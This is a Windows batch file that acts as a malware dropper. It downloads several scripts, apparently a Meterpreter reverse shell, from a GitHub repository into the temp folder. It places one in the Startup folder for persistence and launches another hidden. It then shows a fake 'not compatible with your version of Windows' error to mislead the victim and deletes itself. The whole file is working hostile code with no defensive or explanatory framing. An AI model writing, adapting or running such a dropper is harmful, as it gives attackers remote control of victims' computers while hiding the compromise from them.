@echo off
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/rev.bat -o "%temp%\rev.bat"
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/sh.ps1 -o "%temp%\sh.ps1"
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/start.bat -o "%temp%\start.bat"
curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat"
move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden"
echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
timeout /t 3 >nul
del "%~f0"
